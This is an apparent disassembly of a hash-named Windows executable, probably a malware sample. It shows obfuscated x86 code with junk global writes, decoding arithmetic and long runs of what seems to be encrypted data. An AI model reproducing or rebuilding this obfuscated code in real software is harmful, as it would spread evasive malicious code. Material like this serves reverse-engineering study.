
89fb540b99aa745efdf18502282de50450646ff26fae87d2089b01c9bdece41a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	mov    DWORD PTR ds:0x434429,0x7186
  401015:	mov    DWORD PTR [ebp-0x20],eax
  401018:	mov    ecx,DWORD PTR [ebp-0x20]
  40101b:	mov    DWORD PTR ds:0x43439e,0x6cee
  401025:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40102c:	mov    DWORD PTR ds:0x4326f0,0x6120
  401036:	cmp    ecx,eax
  401038:	mov    DWORD PTR ds:0x43441d,0x7018
  401042:	jne    0x4019f7
  401048:	mov    ax,WORD PTR [ebp-0x24]
  40104c:	push   esi
  40104d:	mov    DWORD PTR ds:0x4326fc,0x1b
  401057:	cmp    DWORD PTR ds:0x4326fc,0x0
  40105e:	je     0x40108e
  401064:	cmp    DWORD PTR ds:0x4326fc,0x22
  40106b:	jne    0x40107c
  401071:	push   0x432dc2
  401076:	call   DWORD PTR ds:0x4329b2
  40107c:	mov    ecx,DWORD PTR ds:0x4326fc
  401082:	dec    ecx
  401083:	mov    DWORD PTR ds:0x4326fc,ecx
  401089:	jmp    0x401057
  40108e:	mov    ecx,0x8a3e
  401093:	mov    DWORD PTR ds:0x43438a,0x48c
  40109d:	xor    ax,cx
  4010a0:	add    DWORD PTR ds:0x434419,0x61ba
  4010aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4010ad:	xor    esi,DWORD PTR ds:0x434396
  4010b3:	push   edi
  4010b4:	mov    DWORD PTR ds:0x43437a,0x1c
  4010be:	cmp    DWORD PTR ds:0x43437a,0x0
  4010c5:	je     0x401105
  4010cb:	cmp    DWORD PTR ds:0x43437a,0x25
  4010d2:	jne    0x4010f3
  4010d8:	push   0x38d9
  4010dd:	push   DWORD PTR [ebp-0xc]
  4010e0:	push   0x7b63
  4010e5:	push   0x618f
  4010ea:	push   DWORD PTR [ebp-0x28]
  4010ed:	call   DWORD PTR ds:0x4329b6
  4010f3:	mov    edi,DWORD PTR ds:0x43437a
  4010f9:	dec    edi
  4010fa:	mov    DWORD PTR ds:0x43437a,edi
  401100:	jmp    0x4010be
  401105:	mov    edi,0x3b04
  40110a:	xor    DWORD PTR ds:0x432700,edx
  401110:	add    ax,di
  401113:	add    DWORD PTR ds:0x43439a,0xf3f
  40111d:	movzx  eax,ax
  401120:	add    DWORD PTR ds:0x4326f4,edi
  401126:	not    eax
  401128:	or     esi,DWORD PTR ds:0x434411
  40112e:	and    eax,DWORD PTR [ecx]
  401130:	movzx  ecx,WORD PTR ds:0x432dc2
  401137:	xor    DWORD PTR ds:0x432de6,ecx
  40113d:	mov    ecx,DWORD PTR [ebp+0x8]
  401140:	sub    DWORD PTR ds:0x434425,ecx
  401146:	mov    DWORD PTR [ecx],eax
  401148:	adc    ecx,0x6b0b
  40114e:	mov    ecx,0x7510855
  401153:	sbb    esi,DWORD PTR ds:0x432dda
  401159:	mov    esi,0x32729c
  40115e:	sbb    DWORD PTR ds:0x434425,0x3918
  401168:	push   ebx
  401169:	or     DWORD PTR ds:0x4343a2,ebx
  40116f:	mov    ax,WORD PTR [ebp-0x24]
  401173:	dec    ebx
  401174:	movzx  eax,ax
  401177:	mov    DWORD PTR [ebp-0x38],eax
  40117a:	sub    eax,0x1c8b
  40117f:	mov    eax,DWORD PTR [ebp+0x8]
  401182:	mov    DWORD PTR [ebp-0x28],eax
  401185:	xor    eax,eax
  401187:	or     eax,DWORD PTR ds:0x432dce
  40118d:	add    DWORD PTR ds:0x434376,eax
  401193:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  40119a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4011a1:	mov    eax,0x9577
  4011a6:	or     DWORD PTR ds:0x43439a,0x2325
  4011b0:	mov    WORD PTR [ebp-0x4],ax
  4011b4:	movzx  ebx,BYTE PTR ds:0x4326f4
  4011bb:	or     DWORD PTR ds:0x4326f0,ebx
  4011c1:	lea    eax,[ebp-0x30]
  4011c4:	mov    DWORD PTR [ebp-0x34],eax
  4011c7:	mov    eax,DWORD PTR [ebp-0x28]
  4011ca:	mov    DWORD PTR [ebp-0x2c],eax
  4011cd:	add    DWORD PTR ds:0x434419,0x693e
  4011d7:	lea    eax,[ebp-0x18]
  4011da:	and    DWORD PTR ds:0x43436a,0x0
  4011e4:	jmp    0x4011f6
  4011e9:	mov    ebx,DWORD PTR ds:0x43436a
  4011ef:	inc    ebx
  4011f0:	mov    DWORD PTR ds:0x43436a,ebx
  4011f6:	cmp    DWORD PTR ds:0x43436a,0x18
  4011fd:	jae    0x40123a
  401203:	cmp    DWORD PTR ds:0x43436a,0x8
  40120a:	jne    0x40121b
  401210:	push   0x7a50
  401215:	call   DWORD PTR ds:0x4329ba
  40121b:	cmp    DWORD PTR ds:0x43436a,0x7
  401222:	jne    0x401235
  401228:	mov    ebx,DWORD PTR ds:0x43436a
  40122e:	inc    ebx
  40122f:	mov    DWORD PTR ds:0x43436a,ebx
  401235:	jmp    0x4011e9
  40123a:	mov    DWORD PTR [ebp-0x1c],eax
  40123d:	mov    eax,DWORD PTR [ebp-0x1c]
  401240:	mov    DWORD PTR [eax],0xf89f2da9
  401246:	mov    eax,DWORD PTR [ebp-0x14]
  401249:	mov    ebx,DWORD PTR [ebp-0x8]
  40124c:	and    DWORD PTR ds:0x434415,0x66ce
  401256:	xor    eax,ecx
  401258:	xor    ebx,ecx
  40125a:	and    DWORD PTR ds:0x434419,0x3a0f
  401264:	xor    edx,edx
  401266:	and    DWORD PTR ds:0x432de6,0x4326f0
  401270:	add    eax,esi
  401272:	mov    DWORD PTR ds:0x43441d,0x1b71
  40127c:	add    ebx,esi
  40127e:	div    ebx
  401280:	mov    DWORD PTR ds:0x434376,0x5747
  40128a:	mov    edx,DWORD PTR [ebp-0x2c]
  40128d:	mov    DWORD PTR ds:0x4326f4,0x57da
  401297:	cmp    eax,DWORD PTR [edx]
  401299:	mov    DWORD PTR ds:0x434382,0x6b31
  4012a3:	je     0x4019ca
  4012a9:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  4012b0:	lea    eax,[ebp-0xc]
  4012b3:	sbb    edx,DWORD PTR ds:0x432dca
  4012b9:	mov    DWORD PTR [ebp-0x10],eax
  4012bc:	mov    eax,DWORD PTR [ebp-0x10]
  4012bf:	jmp    0x401447
  4012c4:	popa   
  4012c5:	xchg   BYTE PTR ds:0x6151e949,cl
  4012cb:	mov    dh,0x3f
  4012cd:	mov    ah,0xd5
  4012cf:	mov    dl,0x25
  4012d1:	sbb    eax,0x707053e3
  4012d6:	jo     0x401348
  4012d8:	in     eax,0x7f
  4012da:	jo     0x40134c
  4012dc:	rcl    bh,0x3d
  4012df:	aad    0x39
  4012e1:	ror    edi,cl
  4012e3:	rol    eax,1
  4012e5:	pop    es
  4012e6:	push   es
  4012e7:	add    ecx,DWORD PTR [edi]
  4012e9:	mov    eax,ds:0xf330f02
  4012ee:	ret    0xc71a
  4012f1:	adc    bl,BYTE PTR [edi]
  4012f3:	mov    ecx,0xddb7025a
  4012f8:	add    bh,ch
  4012fa:	mov    ebp,0x8003c8db
  4012ff:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401305:	lods   eax,DWORD PTR ds:[esi]
  401306:	sar    BYTE PTR [eax+0x6fee581f],1
  40130c:	or     edx,DWORD PTR [ecx]
  40130e:	sahf   
  40130f:	jp     0x4012d9
  401311:	inc    edx
  401312:	lods   al,BYTE PTR ds:[esi]
  401313:	push   ebx
  401314:	sub    eax,0xad3ec6d1
  401319:	mov    WORD PTR [ebx-0x3b],?
  40131c:	stos   DWORD PTR es:[edi],eax
  40131d:	js     0x4012e5
  40131f:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401325:	jmp    0x401359
  401327:	mov    ebp,ecx
  401329:	dec    edi
  40132a:	fcomp  DWORD PTR [eax-0x656800bf]
  401330:	pop    es
  401331:	test   eax,0xed4dbddc
  401336:	sub    BYTE PTR [ebp+0x23],dl
  401339:	mov    ah,0xec
  40133b:	pusha  
  40133c:	nop
  40133d:	mov    esi,0x94c3117b
  401342:	and    esi,edx
  401344:	jmp    0x401396
  401346:	(bad)  
  401347:	out    0xba,al
  401349:	repnz in al,dx
  40134b:	xchg   esp,eax
  40134c:	xor    edi,ecx
  40134e:	jbe    0x4013b5
  401350:	xlat   BYTE PTR ds:[ebx]
  401351:	and    cl,ch
  401353:	add    al,0xd9
  401355:	adc    DWORD PTR [ecx-0x68],edx
  401358:	xor    eax,0x7a616f03
  40135d:	or     dh,BYTE PTR [ecx]
  40135f:	fld    QWORD PTR [eax+0x7f752a56]
  401365:	xor    BYTE PTR [edi+0xba8db0c],cl
  40136b:	pop    ebx
  40136c:	push   ebp
  40136d:	(bad)  
  40136f:	or     ebx,edx
  401371:	pop    esi
  401372:	fstp   DWORD PTR [ecx]
  401374:	jno    0x401306
  401376:	mov    eax,0x2b15374b
  40137b:	ja     0x4013a6
  40137d:	sbb    al,0xd3
  40137f:	xor    BYTE PTR [edi-0x16],cl
  401382:	int    0xa6
  401384:	and    BYTE PTR [esp+ebp*1],ch
  401387:	and    eax,0x5dcd516b
  40138c:	pop    ecx
  40138d:	cwde   
  40138e:	jg     0x4013bc
  401390:	es xor edx,edi
  401393:	jmp    0x40139c
  401395:	push   ebp
  401396:	mov    ah,0xa2
  401398:	test   eax,0xb82ea826
  40139d:	sbb    esi,DWORD PTR [ecx-0x19]
  4013a0:	ror    DWORD PTR [edx+eax*8],cl
  4013a3:	cmp    al,0x79
  4013a5:	in     eax,dx
  4013a6:	dec    edi
  4013a7:	lock add DWORD PTR [esi+0x77],esi
  4013ab:	in     eax,0xae
  4013ad:	loope  0x401374
  4013af:	add    DWORD PTR [edi-0x69d349d0],esp
  4013b5:	mov    dl,0x42
  4013b7:	push   esp
  4013b8:	mov    ebx,0x4077d8cc
  4013bd:	jnp    0x40143c
  4013bf:	push   0x7bcde119
  4013c4:	push   edi
  4013c5:	xchg   edi,esi
  4013c7:	rcl    DWORD PTR [ecx-0x1c],cl
  4013ca:	cli    
  4013cb:	gs push eax
  4013cd:	rcr    BYTE PTR [edi+0x19],cl
  4013d0:	addr16 call 0x5663:0x2f2d629d
  4013d8:	enter  0x4931,0x65
  4013dc:	xchg   ebp,eax
  4013dd:	test   BYTE PTR [edx+0x5ee3fe1d],bl
  4013e3:	(bad)  
  4013e4:	mov    ebx,DWORD PTR [ebx+0x798eb113]
  4013ea:	lock cld 
  4013ec:	into   
  4013ed:	pop    edx
  4013ef:	xor    BYTE PTR [esi+0x44],ah
  4013f2:	dec    ebp
  4013f3:	cld    
  4013f4:	inc    edx
  4013f5:	cmp    BYTE PTR [edx-0x18],dl
  4013f8:	push   0xf
  4013fa:	cli    
  4013fb:	sub    bl,BYTE PTR [ebx-0x56c54186]
  401401:	fldcw  WORD PTR [esp+esi*8-0x2]
  401405:	retf   0x14fb
  401408:	inc    ebx
  401409:	push   es
  40140a:	xor    ecx,0xfffffff2
  40140d:	fnstcw WORD PTR [edi+0x44bbd3ae]
  401413:	arpl   WORD PTR [ecx-0x5c3a3bdc],ax
  401419:	and    ebx,eax
  40141b:	xor    al,0xf2
  40141d:	stc    
  40141e:	(bad)  
  40141f:	cmp    al,0x22
  401421:	(bad)  
  401422:	jle    0x401444
  401424:	mov    bh,0xb5
  401426:	jg     0x401451
  401428:	cmp    al,0x8e
  40142a:	xchg   ebp,eax
  40142b:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40142d:	inc    edi
  40142e:	(bad)  
  40142f:	fadd   st(7),st
  401431:	inc    bx
  401433:	lea    edx,[edi+0x67]
  401436:	cdq    
  401437:	arpl   WORD PTR [edi+0x7e],di
  40143a:	ret    
  40143b:	sbb    DWORD PTR [eax+0x3c40cdda],esi
  401441:	ret    0x97fa
  401444:	das    
  401445:	pushf  
  401446:	sub    ecx,DWORD PTR [ebx-0x132d96f0]
  40144c:	test   eax,0x1089f89e
  401451:	mov    eax,DWORD PTR [ebp-0xc]
  401454:	cmp    eax,0x742b26d4
  401459:	jmp    0x4015e1
  40145e:	push   ds
  40145f:	fcmovnb st,st(2)
  401461:	mov    edx,0x5ba661c1
  401466:	xlat   BYTE PTR ds:[ebx]
  401467:	les    ecx,FWORD PTR [esi]
  401469:	test   DWORD PTR [ebp-0x6e],esi
  40146c:	jmp    0xe570:0x707fe5cf
  401473:	jg     0x4014e5
  401475:	jo     0x401441
  401477:	aam    0x2
  401479:	push   eax
  40147a:	stos   BYTE PTR es:[edi],al
  40147b:	cld    
  40147c:	imul   esp,ecx,0xffffffe2
  40147f:	add    al,0xb1
  401481:	int3   
  401482:	std    
  401483:	je     0x4014e4
  401485:	adc    bh,BYTE PTR [eax-0x5]
  401488:	ja     0x40145e
  40148a:	dec    eax
  40148b:	mov    ebp,0x5c287f23
  401490:	lock sti 
  401492:	push   ss
  401493:	das    
  401494:	ret    0xe1a8
  401497:	ins    BYTE PTR es:[edi],dx
  401498:	call   0x348e:0xee864d65
  40149f:	je     0x401501
  4014a1:	mov    bl,ah
  4014a3:	sub    eax,0xd64c5de
  4014a8:	mov    BYTE PTR [ecx],ah
  4014aa:	popf   
  4014ab:	daa    
  4014ac:	js     0x401433
  4014ae:	scas   eax,DWORD PTR es:[edi]
  4014af:	loopne 0x401492
  4014b1:	in     al,dx
  4014b2:	inc    ecx
  4014b3:	mov    al,0x43
  4014b5:	loope  0x401516
  4014b7:	daa    
  4014b8:	clc    
  4014b9:	inc    ebx
  4014ba:	sbb    al,0x51
  4014bc:	cmp    dl,al
  4014be:	les    edi,FWORD PTR [edi+0x6e]
  4014c1:	retf   0xdd32
  4014c4:	cli    
  4014c5:	xor    DWORD PTR [ecx-0x5323e8d3],0x4fd3ae99
  4014cf:	mov    esi,0x601c33d5
  4014d4:	mov    dl,BYTE PTR [esi]
  4014d6:	xchg   ebx,eax
  4014d7:	mov    edx,?
  4014d9:	jo     0x4014cd
  4014db:	cwde   
  4014dc:	jge    0x40147a
  4014de:	imul   esi,DWORD PTR [ebx+edx*1+0x49],0xffffffef
  4014e3:	xor    bh,BYTE PTR [ebx-0x2d093b54]
  4014e9:	adc    bl,BYTE PTR [edx]
  4014eb:	pop    ecx
  4014ec:	dec    ecx
  4014ed:	mov    ds:0x12375b97,eax
  4014f2:	pop    ss
  4014f3:	call   0x9e91d664
  4014f8:	jne    0x401546
  4014fa:	(bad)  
  4014fb:	les    esi,FWORD PTR [esi]
  4014fd:	pop    esp
  4014fe:	fisubr WORD PTR [ecx-0x49]
  401501:	rcr    cl,0xaa
  401504:	mov    ah,0xfe
  401506:	inc    ecx
  401507:	hlt    
  401508:	fucomi st,st(1)
  40150a:	adc    BYTE PTR gs:[ecx+0x708d6484],ch
  401511:	cmp    DWORD PTR [edx+0x78],ecx
  401514:	mov    esi,0x671616b5
  401519:	jecxz  0x4014a5
  40151b:	adc    al,0x2c
  40151d:	daa    
  40151e:	or     DWORD PTR [esi-0x38],edx
  401521:	push   esp
  401522:	sbb    ebx,esp
  401524:	call   0x9621:0x940065c7
  40152b:	(bad)  
  40152c:	bound  edi,QWORD PTR [ebx+ebp*8+0x25]
  401530:	xor    cl,BYTE PTR [eax-0x32]
  401533:	pop    ds
  401534:	mov    al,0xdb
  401536:	lods   eax,DWORD PTR ds:[esi]
  401537:	sub    al,0x61
  401539:	lods   eax,DWORD PTR ds:[esi]
  40153a:	sbb    BYTE PTR [eax],ch
  40153c:	mov    ebx,0x68ee0af7
  401541:	xchg   esp,eax
  401542:	inc    edx
  401543:	test   DWORD PTR es:[esi],edx
  401546:	xchg   edi,eax
  401547:	xor    eax,0x2f0c5b55
  40154c:	push   ss
  40154d:	(bad)  
  40154e:	mov    ah,0x98
  401550:	pop    ebp
  401551:	add    BYTE PTR [ebp+0x44],ah
  401554:	mov    dl,0xf3
  401556:	jae    0x40153f
  401558:	jmp    0x17fa7d7c
  40155d:	sub    DWORD PTR [ebx+0x39],eax
  401560:	(bad)  
  401561:	jg     0x401516
  401563:	mov    dh,0xfb
  401565:	dec    edx
  401566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401567:	(bad)  
  401568:	jnp    0x40152d
  40156a:	mov    bh,0xa9
  40156c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40156d:	std    
  40156e:	das    
  40156f:	clc    
  401570:	cli    
  401571:	cmp    BYTE PTR [ebx],al
  401573:	std    
  401574:	ins    DWORD PTR es:[edi],dx
  401575:	dec    ebp
  401576:	inc    ebp
  401577:	je     0x401576
  401579:	mov    ds,WORD PTR [ebx+0x0]
  40157c:	push   0x9d22f297
  401581:	cmp    ecx,DWORD PTR [edi+0x20]
  401584:	repz cdq 
  401586:	sub    al,0x2b
  401588:	retf   
  401589:	popa   
  40158a:	xchg   edx,eax
  40158b:	jmp    0x401564
  40158d:	inc    ecx
  40158e:	xchg   ebx,eax
  40158f:	sub    eax,0xaf5fea2c
  401594:	(bad)
  401597:	fimul  WORD PTR [ebx+0x28]
  40159a:	adc    al,0x78
  40159c:	out    dx,al
  40159d:	(bad)  
  40159e:	fstp   TBYTE PTR [edi]
  4015a0:	rol    DWORD PTR [esi],0x14
  4015a3:	jmp    0x401617
  4015a5:	xor    eax,0x5b95a53b
  4015aa:	xchg   DWORD PTR [edx-0x43889eee],ecx
  4015b0:	mov    ds:0x85eb5413,eax
  4015b5:	stos   BYTE PTR es:[edi],al
  4015b6:	test   DWORD PTR ds:0xac0b4495,ebp
  4015bc:	stos   DWORD PTR es:[edi],eax
  4015bd:	scas   eax,DWORD PTR es:[edi]
  4015be:	push   ecx
  4015bf:	dec    edx
  4015c0:	aad    0xf9
  4015c2:	cmp    ch,BYTE PTR [edx]
  4015c4:	jns    0x401642
  4015c6:	movzx  ecx,BYTE PTR [ebx+0x33]
  4015ca:	add    edx,DWORD PTR ds:0x5859f838
  4015d0:	mov    dh,0x2b
  4015d2:	mov    al,0xf5
  4015d4:	and    eax,0x7db2bcc0
  4015d9:	xchg   esp,eax
  4015da:	sub    bl,BYTE PTR [edi]
  4015dc:	add    bh,bl
  4015de:	out    dx,eax
  4015df:	or     DWORD PTR [edx],0xe840f
  4015e5:	add    BYTE PTR [eax],al
  4015e7:	mov    eax,DWORD PTR [ebp-0x1c]
  4015ea:	or     DWORD PTR [eax],0x60751c9c
  4015f0:	jmp    0x4019d9
  4015f5:	mov    eax,DWORD PTR [ebp-0xc]
  4015f8:	add    eax,DWORD PTR [ebp-0x18]
  4015fb:	cmp    eax,0x6cca547d
  401600:	je     0x401614
  401606:	mov    eax,DWORD PTR [ebp-0x10]
  401609:	and    DWORD PTR [eax],0x751c99
  40160f:	jmp    0x4019d9
  401614:	mov    eax,DWORD PTR [ebp-0xc]
  401617:	mov    edx,DWORD PTR [ebp-0x18]
  40161a:	or     eax,edx
  40161c:	cmp    eax,0xfcbf2ffd
  401621:	je     0x401635
  401627:	mov    eax,DWORD PTR [ebp-0x10]
  40162a:	xor    DWORD PTR [eax],0x2650fa8f
  401630:	jmp    0x4019d9
  401635:	mov    ax,WORD PTR [ebp-0x4]
  401639:	mov    edx,0x8a3e
  40163e:	xor    ax,dx
  401641:	mov    edx,DWORD PTR [ebp-0x28]
  401644:	mov    edx,DWORD PTR [edx]
  401646:	add    ax,di
  401649:	cmp    ax,WORD PTR [edx]
  40164c:	je     0x401821
  401652:	mov    eax,DWORD PTR [ebp-0x14]
  401655:	xor    eax,ecx
  401657:	add    eax,esi
  401659:	mov    DWORD PTR [ebp-0x30],eax
  40165c:	mov    eax,DWORD PTR [ebp-0x34]
  40165f:	mov    dx,WORD PTR [ebp-0x38]
  401663:	mov    ebx,0x8a3e
  401668:	xor    dx,bx
  40166b:	mov    ebx,DWORD PTR [ebp-0x8]
  40166e:	add    dx,di
  401671:	jmp    0x4017f9
  401676:	clc    
  401677:	repnz sbb eax,0xa851698d
  40167d:	icebp  
  40167e:	pusha  
  40167f:	xchg   ebx,eax
  401680:	rcl    DWORD PTR [ebx+0x1c],1
  401683:	pop    ebx
  401684:	sub    bl,0x4a
  401687:	jle    0x4016f9
  401689:	jo     0x401670
  40168b:	jg     0x4016fd
  40168d:	jo     0x4016e6
  40168f:	add    BYTE PTR [ecx],dh
  401691:	mov    DWORD PTR [edi+ebx*8],edx
  401694:	imul   ecx,DWORD PTR [edi+0x1e7ba178],0x5bfbe2de
  40169e:	cmp    ah,BYTE PTR [ebx+esi*4+0x7572a9d0]
  4016a5:	icebp  
  4016a6:	push   0x5b82b092
  4016ab:	jg     0x401652
  4016ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016ae:	xchg   esp,eax
  4016af:	aam    0x8
  4016b1:	dec    ebp
  4016b2:	cmp    edx,DWORD PTR [ecx+0x6b]
  4016b5:	outs   dx,DWORD PTR ds:[esi]
  4016b6:	lds    ebp,FWORD PTR [eax+0x35]
  4016b9:	sbb    al,0xad
  4016bb:	test   DWORD PTR [ebx+edx*2],ebx
  4016be:	mov    dl,0xa1
  4016c0:	retf   0x9c0a
  4016c3:	mov    esp,es
  4016c5:	mov    dh,0x7b
  4016c7:	pop    edi
  4016c8:	pusha  
  4016c9:	dec    ecx
  4016ca:	xchg   ebp,eax
  4016cb:	mov    ds:0xe8a18a25,eax
  4016d0:	fmulp  st(1),st
  4016d2:	dec    ebx
  4016d3:	retf   0x970c
  4016d6:	xor    al,0xa4
  4016d8:	inc    eax
  4016d9:	and    dh,BYTE PTR [eax-0x3980311f]
  4016df:	mov    ebp,DWORD PTR [ecx+0x68]
  4016e2:	mov    cl,0x84
  4016e4:	and    ebx,DWORD PTR [edx]
  4016e6:	aam    0x80
  4016e8:	add    eax,0x67f23de4
  4016ed:	dec    ebx
  4016ee:	adc    DWORD PTR [edi],0x32
  4016f1:	adc    BYTE PTR [esi-0x20678b4a],bl
  4016f7:	mov    ecx,DWORD PTR [esi-0x7b]
  4016fa:	out    dx,eax
  4016fb:	mov    eax,0x4d52a9bb
  401700:	repnz mov WORD PTR [edx-0x7e],cs
  401704:	fsub   QWORD PTR [edx+ecx*8-0x9236278]
  40170b:	in     al,dx
  40170c:	or     cl,ch
  40170e:	aam    0xaf
  401710:	ja     0x40171e
  401712:	push   ecx
  401713:	cli    
  401714:	xor    al,0xe1
  401717:	add    esp,edx
  401719:	pop    edx
  40171a:	jmp    0x401707
  40171c:	jae    0x401772
  40171e:	out    0x35,eax
  401720:	and    ah,BYTE PTR [esi]
  401722:	xchg   esi,eax
  401723:	rcl    BYTE PTR [esi+edi*2],1
  401726:	and    BYTE PTR ds:[edx],0xbd
  40172a:	push   es
  40172b:	push   edx
  40172c:	std    
  40172d:	repz mov edx,0x47052389
  401733:	js     0x40174b
  401735:	loopne 0x4016d1
  401737:	(bad)  
  401738:	xor    al,0x4e
  40173a:	ret    
  40173b:	mov    WORD PTR [edx-0x4d],?
  40173e:	sub    DWORD PTR [edi],eax
  401740:	mov    BYTE PTR [esi],dl
  401742:	pop    eax
  401743:	stc    
  401744:	call   0x3911:0xccd453a0
  40174b:	and    esp,DWORD PTR [ecx+0x4f69b36a]
  401751:	stos   DWORD PTR es:[edi],eax
  401752:	adc    al,BYTE PTR [esi+0x1a]
  401755:	add    DWORD PTR es:[ebx],esp
  401758:	dec    esp
  401759:	test   DWORD PTR [ebp-0x10],ecx
  40175c:	div    DWORD PTR [bp+di]
  40175f:	loope  0x401782
  401761:	test   eax,0x457fb785
  401766:	rcr    ch,cl
  401768:	aas    
  401769:	mov    edx,0xed50d5a2
  40176e:	fstp   TBYTE PTR [esi]
  401770:	loopne 0x401760
  401772:	pop    ss
  401773:	push   ebp
  401774:	dec    esi
  401775:	jne    0x40178e
  401777:	fwait
  401778:	mov    edx,0x5c8aa55f
  40177d:	jno    0x4017b6
  40177f:	and    DWORD PTR [edi-0x48728aa2],ebx
  401785:	test   al,0x58
  401787:	mov    ah,0xdb
  401789:	mov    al,ds:0x9026ac8
  40178e:	pop    ecx
  40178f:	push   ebx
  401790:	mov    bl,0x81
  401792:	mov    BYTE PTR [edi],bl
  401794:	in     al,dx
  401795:	lahf   
  401796:	xchg   edi,eax
  401797:	lods   eax,DWORD PTR ds:[esi]
  401798:	sub    al,0x3f
  40179a:	mov    al,0xb7
  40179c:	div    DWORD PTR [esp+ecx*1+0x2ff8741c]
  4017a3:	(bad)  
  4017a4:	xor    esi,0x7bb52340
  4017aa:	add    al,0xc8
  4017ac:	sahf   
  4017ad:	imul   edi,edi,0xffffffae
  4017b0:	or     cl,BYTE PTR [esi+0x2388e206]
  4017b6:	or     DWORD PTR [eax+eax*2],esp
  4017b9:	(bad)
  4017bc:	mov    es,esp
  4017be:	dec    edx
  4017bf:	je     0x4017eb
  4017c1:	mov    DWORD PTR [ecx-0x31],esi
  4017c4:	mov    ecx,DWORD PTR [edi]
  4017c6:	xor    DWORD PTR [edx-0x3a],eax
  4017c9:	inc    esp
  4017ca:	sbb    ecx,DWORD PTR [ebp-0x36]
  4017cd:	fidivr WORD PTR [edx-0x3c]
  4017d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017d2:	sahf   
  4017d3:	mov    esi,0x2659e342
  4017d8:	ins    BYTE PTR es:[edi],dx
  4017d9:	repz jmp 0x6a38:0x1cb9179d
  4017e1:	fstp   QWORD PTR [ecx-0x7a]
  4017e4:	cmp    esi,DWORD PTR [ecx-0x6f93ca3e]
  4017ea:	xor    dl,BYTE PTR [bx+si]
  4017ed:	sti    
  4017ee:	cmp    eax,0xce2f2576
  4017f3:	aam    0xb0
  4017f5:	xchg   ecx,eax
  4017f6:	daa    
  4017f7:	mov    ecx,0xd2b70f03
  4017fc:	xor    ebx,ecx
  4017fe:	lea    edx,[edx+ebx*1+0x32729c]
  401805:	add    DWORD PTR [eax],edx
  401807:	mov    eax,DWORD PTR [ebp-0x2c]
  40180a:	mov    edx,DWORD PTR [ebp-0x8]
  40180d:	mov    ebx,DWORD PTR [ebp-0x30]
  401810:	xor    edx,ecx
  401812:	add    edx,esi
  401814:	imul   edx,ebx
  401817:	sub    DWORD PTR [eax],edx
  401819:	mov    eax,DWORD PTR [ebp-0x14]
  40181c:	jmp    0x4019dc
  401821:	mov    eax,DWORD PTR [ebp-0xc]
  401824:	mov    edx,DWORD PTR [ebp-0x18]
  401827:	jmp    0x4019af
  40182c:	pop    ebx
  40182d:	arpl   di,di
  40182f:	out    dx,eax
  401830:	xchg   ebx,esi
  401832:	imul   esi,DWORD PTR [ebx-0x5d],0x7d
  401836:	jae    0x401839
  401838:	cmp    bh,al
  40183a:	jp     0x4018ab
  40183c:	aas    
  40183d:	jl     0x4018af
  40183f:	jo     0x401826
  401841:	jg     0x4018b3
  401843:	jo     0x40184c
  401845:	lods   eax,DWORD PTR ds:[esi]
  401846:	jp     0x401812
  401848:	cmp    eax,0x90bc2f95
  40184d:	aaa    
  40184e:	mov    eax,0x764d68bf
  401853:	mov    ecx,0xb4bc384c
  401858:	rcr    DWORD PTR [eax-0x17],1
  40185b:	and    DWORD PTR [esp+edi*8+0x2d],ecx
  40185f:	sbb    dl,BYTE PTR [ecx+0x57]
  401862:	or     al,0x0
  401864:	jb     0x40184b
  401866:	dec    eax
  401867:	pop    ds
  401868:	cld    
  401869:	ins    DWORD PTR es:[edi],dx
  40186a:	cmp    DWORD PTR [eax-0x6a],ebp
  40186d:	push   edx
  40186e:	(bad)  
  40186f:	xor    dh,BYTE PTR [edx-0x41]
  401872:	fwait
  401873:	xor    edx,DWORD PTR ds:0x359493db
  401879:	mov    eax,0x1ab00202
  40187e:	xor    DWORD PTR [edx-0x63],0x63
  401882:	stos   DWORD PTR es:[edi],eax
  401883:	stos   DWORD PTR es:[edi],eax
  401884:	lods   al,BYTE PTR ds:[esi]
  401885:	stos   BYTE PTR es:[edi],al
  401886:	(bad)  
  401887:	jmp    0x59fd:0xb3b89d5a
  40188e:	mov    edi,0xd13ec181
  401893:	push   ecx
  401894:	loopne 0x4018bd
  401896:	jb     0x40188a
  401898:	mov    dh,0x12
  40189a:	inc    edx
  40189b:	cwde   
  40189c:	pop    eax
  40189d:	cs daa 
  40189f:	xchg   esp,eax
  4018a0:	(bad)  
  4018a1:	xlat   BYTE PTR ds:[ebx]
  4018a2:	js     0x4018ba
  4018a4:	sbb    BYTE PTR cs:[edi-0x2afcf4be],dl
  4018ab:	das    
  4018ac:	xor    BYTE PTR [ebx],bh
  4018ae:	xchg   esi,eax
  4018af:	daa    
  4018b0:	out    dx,al
  4018b1:	mov    esi,0xd72ab438
  4018b6:	sub    ah,BYTE PTR [edi+ecx*4+0x45]
  4018ba:	mov    ah,0x8e
  4018bc:	xor    dl,BYTE PTR [ebx+0x66aa548a]
  4018c2:	jmp    0xad414797
  4018c7:	xchg   esi,eax
  4018c8:	cli    
  4018c9:	pop    ds
  4018ca:	int    0x84
  4018cc:	test   esi,ebx
  4018ce:	aad    0x56
  4018d0:	sbb    eax,DWORD PTR [ebx+ebp*4-0x7f]
  4018d4:	jae    0x4018b5
  4018d6:	pop    ds
  4018d7:	mov    ebp,DWORD PTR [ebx]
  4018d9:	mov    bl,ah
  4018db:	popf   
  4018dc:	pop    ds
  4018dd:	retf   
  4018de:	jb     0x40191c
  4018e0:	mov    esi,0x550fb4f4
  4018e5:	fiadd  WORD PTR [edx+eax*8+0x76b14c67]
  4018ec:	inc    edi
  4018ed:	loop   0x4018b1
  4018ef:	adc    BYTE PTR [esp+edx*8],al
  4018f2:	mov    dh,0x84
  4018f4:	ds sub al,0xe1
  4018f7:	add    bl,BYTE PTR [ebp-0x4b]
  4018fa:	fcmovbe st,st(4)
